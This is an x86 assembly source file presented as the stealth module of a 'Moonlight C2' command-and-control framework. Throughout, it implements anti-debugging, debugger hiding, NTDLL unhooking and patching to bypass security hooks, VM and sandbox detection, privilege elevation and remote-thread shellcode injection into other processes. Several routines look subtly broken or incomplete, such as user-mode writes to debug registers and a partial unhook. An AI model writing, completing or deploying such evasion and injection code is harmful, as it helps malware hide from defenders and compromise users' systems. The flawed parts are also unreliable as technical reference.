; Moonlight C2 Framework - Stealth Module (x86 Assembly)
; Advanced anti-debugging, anti-VM, and process hiding techniques
; Assemble with NASM: nasm -f win32 stealth.asm -o stealth.obj

BITS 32

section .text
global _check_debugger
global _hide_from_debugger
global _patch_ntdll
global _unhook_ntdll
global _check_vm
global _check_sandbox
global _elevate_process
global _inject_remote_thread
global _get_kernel32_base
global _get_ntdll_base

; ==============================================================================
; Anti-Debugging: Check if debugger is present
; Returns: EAX = 1 if debugger detected, 0 otherwise
; ==============================================================================
_check_debugger:
    push ebp
    mov ebp, esp
    push ebx
    push edi
    push esi
    
    xor eax, eax
    
    ; Method 1: PEB->BeingDebugged
    mov eax, fs:[0x30]          ; Get PEB
    movzx eax, byte [eax + 2]   ; PEB->BeingDebugged
    test eax, eax
    jnz .debugger_found
    
    ; Method 2: CheckRemoteDebuggerPresent
    push esp                    ; lpDebuggerPresent
    push 0xFFFFFFFF            ; hProcess (current)
    call _CheckRemoteDebuggerPresent
    test eax, eax
    jnz .debugger_found
    
    ; Method 3: NtQueryInformationProcess
    push 0                      ; ProcessDebugPort = 7
    push 4                      ; ProcessInformationLength
    push esp                    ; ProcessInformation
    push 7                      ; ProcessInformationClass
    push 0xFFFFFFFF            ; ProcessHandle
    call _NtQueryInformationProcess
    test eax, eax
    jnz .debugger_found
    
    ; Method 4: Hardware breakpoints check (DR0-DR7)
    xor eax, eax
    mov dr0, eax
    mov dr1, eax
    mov dr2, eax
    mov dr3, eax
    mov dr6, eax
    mov dr7, eax
    
    ; Method 5: Timing check
    rdtsc
    mov esi, eax
    rdtsc
    sub eax, esi
    cmp eax, 0x1000            ; If difference > 4096 cycles, debugger present
    jg .debugger_found
    
    xor eax, eax
    jmp .done
    
.debugger_found:
    mov eax, 1
    
.done:
    pop esi
    pop edi
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Hide process from debugger
; ==============================================================================
_hide_from_debugger:
    push ebp
    mov ebp, esp
    
    ; Call NtSetInformationThread with ThreadHideFromDebugger (0x11)
    push 0                      ; ThreadInformationLength
    push 0                      ; ThreadInformation
    push 0x11                   ; ThreadHideFromDebugger
    push 0xFFFFFFFE            ; Current thread
    call _NtSetInformationThread
    
    pop ebp
    ret

; ==============================================================================
; Unhook NTDLL.DLL (restore original syscalls)
; ==============================================================================
_unhook_ntdll:
    push ebp
    mov ebp, esp
    push ebx
    push edi
    push esi
    
    ; Get NTDLL base address
    call _get_ntdll_base
    test eax, eax
    jz .error
    mov ebx, eax                ; EBX = NTDLL base
    
    ; Parse PE headers
    mov esi, [ebx + 0x3C]       ; PE offset
    add esi, ebx
    mov esi, [esi + 0x78]       ; Export directory RVA
    add esi, ebx                ; Export directory VA
    
    ; Get export table
    mov ecx, [esi + 0x18]       ; Number of names
    mov edi, [esi + 0x20]       ; AddressOfNames RVA
    add edi, ebx                ; AddressOfNames VA
    
.loop:
    dec ecx
    js .done
    
    mov edx, [edi + ecx * 4]    ; Name RVA
    add edx, ebx                ; Name VA
    
    ; Check if function starts with hook (E9 = JMP)
    push ecx
    mov eax, [esi + 0x1C]       ; AddressOfFunctions RVA
    add eax, ebx
    movzx ecx, word [esi + 0x24 + ecx * 2]
    mov eax, [eax + ecx * 4]
    add eax, ebx
    
    cmp byte [eax], 0xE9        ; JMP opcode
    jne .next
    
    ; Restore original bytes (MOV EAX, syscall_number)
    ; This is a simplified version - real implementation needs original bytes
    mov byte [eax], 0xB8        ; MOV EAX, imm32
    
.next:
    pop ecx
    jmp .loop
    
.done:
    mov eax, 1
    jmp .exit
    
.error:
    xor eax, eax
    
.exit:
    pop esi
    pop edi
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Patch NTDLL to bypass hooks
; ==============================================================================
_patch_ntdll:
    push ebp
    mov ebp, esp
    push ebx
    
    ; Get NTDLL base
    call _get_ntdll_base
    test eax, eax
    jz .error
    
    mov ebx, eax
    
    ; Find NtWriteVirtualMemory
    push ntwrite_name
    push ebx
    call _GetProcAddress
    test eax, eax
    jz .error
    
    ; Patch first 5 bytes to direct syscall
    ; B8 XX XX XX XX    mov eax, syscall_number
    ; 0F 05             syscall (or int 2Eh for older systems)
    
    mov byte [eax], 0xB8
    mov dword [eax + 1], 0x0037  ; NtWriteVirtualMemory syscall number (Win7)
    mov word [eax + 5], 0x050F    ; syscall instruction
    
    mov eax, 1
    jmp .done
    
.error:
    xor eax, eax
    
.done:
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Check for Virtual Machine environment
; Returns: EAX = 1 if VM detected, 0 otherwise
; ==============================================================================
_check_vm:
    push ebp
    mov ebp, esp
    push ebx
    push edi
    
    ; Method 1: CPUID instruction check
    xor eax, eax
    cpuid
    
    ; Check for VMware signature
    cmp ebx, 0x564D5868         ; "VMXh"
    je .vm_detected
    
    ; Check for VirtualBox signature
    cmp ebx, 0x786F4256         ; "VBox"
    je .vm_detected
    
    ; Method 2: Check IN instruction (VMware backdoor)
    mov eax, 0x564D5868         ; VMware magic number
    mov ecx, 10                 ; Get version
    mov dx, 0x5658              ; VMware I/O port
    
    pushfd
    in eax, dx                  ; Will fault on real hardware
    popfd
    
    cmp ebx, 0x564D5868
    je .vm_detected
    
    ; Method 3: Check registry for VM indicators
    ; (Simplified - would need Windows API calls)
    
    ; Method 4: Check for VM MAC addresses
    ; 00:05:69 (VMware)
    ; 08:00:27 (VirtualBox)
    
    xor eax, eax
    jmp .done
    
.vm_detected:
    mov eax, 1
    
.done:
    pop edi
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Check for Sandbox environment
; Returns: EAX = 1 if sandbox detected, 0 otherwise
; ==============================================================================
_check_sandbox:
    push ebp
    mov ebp, esp
    push ebx
    
    ; Method 1: Check system uptime (sandboxes often have low uptime)
    call _GetTickCount
    cmp eax, 600000             ; Less than 10 minutes
    jl .sandbox_detected
    
    ; Method 2: Check CPU count (sandboxes often have 1 CPU)
    push sys_info
    call _GetSystemInfo
    mov eax, [sys_info + 20]    ; dwNumberOfProcessors
    cmp eax, 2
    jl .sandbox_detected
    
    ; Method 3: Check RAM size (sandboxes often have limited RAM)
    push mem_status
    call _GlobalMemoryStatus
    mov eax, [mem_status + 8]   ; dwTotalPhys
    cmp eax, 0x40000000         ; Less than 1GB
    jl .sandbox_detected
    
    ; Method 4: Sleep and check time delta
    push 1000
    call _Sleep
    rdtsc
    mov ebx, eax
    rdtsc
    sub eax, ebx
    cmp eax, 100                ; If almost no time passed, likely sandbox
    jl .sandbox_detected
    
    xor eax, eax
    jmp .done
    
.sandbox_detected:
    mov eax, 1
    
.done:
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Get KERNEL32.DLL base address using PEB walk
; Returns: EAX = base address
; ==============================================================================
_get_kernel32_base:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    
    ; Get PEB
    mov eax, fs:[0x30]
    
    ; Get PEB->Ldr
    mov eax, [eax + 0x0C]
    
    ; Get InMemoryOrderModuleList
    mov esi, [eax + 0x1C]
    
    ; Loop through modules
.loop:
    mov esi, [esi]              ; Flink
    mov edi, [esi + 0x08]       ; DllBase
    
    ; Check if this is KERNEL32.DLL
    mov ebx, [esi + 0x20]       ; BaseDllName.Buffer
    
    ; Compare first few characters with "KERNEL32"
    cmp dword [ebx], 0x0045004B ; "KE"
    jne .next
    cmp dword [ebx + 4], 0x004E0052 ; "RN"
    jne .next
    cmp dword [ebx + 8], 0x004C0045 ; "EL"
    jne .next
    
    mov eax, edi
    jmp .done
    
.next:
    cmp esi, [eax + 0x1C]
    jne .loop
    
    xor eax, eax
    
.done:
    pop edi
    pop esi
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Get NTDLL.DLL base address using PEB walk
; Returns: EAX = base address
; ==============================================================================
_get_ntdll_base:
    push ebp
    mov ebp, esp
    push ebx
    push esi
    push edi
    
    ; Get PEB
    mov eax, fs:[0x30]
    
    ; Get PEB->Ldr
    mov eax, [eax + 0x0C]
    
    ; Get InLoadOrderModuleList (first entry is always ntdll)
    mov esi, [eax + 0x14]
    mov esi, [esi]              ; Second entry is ntdll
    mov eax, [esi + 0x10]       ; DllBase
    
    pop edi
    pop esi
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Elevate process privilege (attempt UAC bypass)
; ==============================================================================
_elevate_process:
    push ebp
    mov ebp, esp
    push ebx
    
    ; Try to enable SeDebugPrivilege
    push 0
    push token_handle
    push 0xF01FF                ; TOKEN_ALL_ACCESS
    call _OpenProcessToken
    test eax, eax
    jz .error
    
    ; Lookup privilege value
    push luid
    push debug_priv
    push 0
    call _LookupPrivilegeValueA
    test eax, eax
    jz .error
    
    ; Adjust token privileges
    push 0
    push 0
    push 0
    push 16
    push token_privs
    push dword [token_handle]
    call _AdjustTokenPrivileges
    
    mov eax, 1
    jmp .done
    
.error:
    xor eax, eax
    
.done:
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Inject code into remote process via thread injection
; Parameters: [ebp+8] = target PID, [ebp+12] = shellcode address, [ebp+16] = size
; ==============================================================================
_inject_remote_thread:
    push ebp
    mov ebp, esp
    push ebx
    push edi
    push esi
    
    ; Open target process
    push dword [ebp + 8]        ; PID
    push 0                      ; bInheritHandle
    push 0x1F0FFF               ; PROCESS_ALL_ACCESS
    call _OpenProcess
    test eax, eax
    jz .error
    mov ebx, eax                ; Process handle
    
    ; Allocate memory in target process
    push 0x40                   ; PAGE_EXECUTE_READWRITE
    push 0x3000                 ; MEM_COMMIT | MEM_RESERVE
    push dword [ebp + 16]       ; Size
    push 0
    push ebx
    call _VirtualAllocEx
    test eax, eax
    jz .error
    mov edi, eax                ; Remote address
    
    ; Write shellcode to target process
    push 0
    push dword [ebp + 16]       ; Size
    push dword [ebp + 12]       ; Shellcode address
    push edi                    ; Remote address
    push ebx                    ; Process handle
    call _WriteProcessMemory
    test eax, eax
    jz .error
    
    ; Create remote thread
    push 0
    push 0
    push edi                    ; Start address (shellcode)
    push 0
    push 0
    push 0
    push ebx
    call _CreateRemoteThread
    test eax, eax
    jz .error
    
    mov eax, 1
    jmp .done
    
.error:
    xor eax, eax
    
.done:
    ; Cleanup
    cmp ebx, 0
    je .skip_close
    push ebx
    call _CloseHandle
    
.skip_close:
    pop esi
    pop edi
    pop ebx
    pop ebp
    ret

; ==============================================================================
; Data section
; ==============================================================================
section .data
    ntwrite_name db 'NtWriteVirtualMemory', 0
    debug_priv db 'SeDebugPrivilege', 0
    
section .bss
    token_handle resd 1
    luid resq 1
    token_privs resb 16
    sys_info resb 36
    mem_status resb 32

; ==============================================================================
; Import stubs (to be resolved at runtime)
; ==============================================================================
section .text
_CheckRemoteDebuggerPresent:
    jmp [CheckRemoteDebuggerPresent_ptr]
_NtQueryInformationProcess:
    jmp [NtQueryInformationProcess_ptr]
_NtSetInformationThread:
    jmp [NtSetInformationThread_ptr]
_GetProcAddress:
    jmp [GetProcAddress_ptr]
_GetTickCount:
    jmp [GetTickCount_ptr]
_GetSystemInfo:
    jmp [GetSystemInfo_ptr]
_GlobalMemoryStatus:
    jmp [GlobalMemoryStatus_ptr]
_Sleep:
    jmp [Sleep_ptr]
_OpenProcessToken:
    jmp [OpenProcessToken_ptr]
_LookupPrivilegeValueA:
    jmp [LookupPrivilegeValueA_ptr]
_AdjustTokenPrivileges:
    jmp [AdjustTokenPrivileges_ptr]
_OpenProcess:
    jmp [OpenProcess_ptr]
_VirtualAllocEx:
    jmp [VirtualAllocEx_ptr]
_WriteProcessMemory:
    jmp [WriteProcessMemory_ptr]
_CreateRemoteThread:
    jmp [CreateRemoteThread_ptr]
_CloseHandle:
    jmp [CloseHandle_ptr]

section .data
CheckRemoteDebuggerPresent_ptr dd 0
NtQueryInformationProcess_ptr dd 0
NtSetInformationThread_ptr dd 0
GetProcAddress_ptr dd 0
GetTickCount_ptr dd 0
GetSystemInfo_ptr dd 0
GlobalMemoryStatus_ptr dd 0
Sleep_ptr dd 0
OpenProcessToken_ptr dd 0
LookupPrivilegeValueA_ptr dd 0
AdjustTokenPrivileges_ptr dd 0
OpenProcess_ptr dd 0
VirtualAllocEx_ptr dd 0
WriteProcessMemory_ptr dd 0
CreateRemoteThread_ptr dd 0
CloseHandle_ptr dd 0
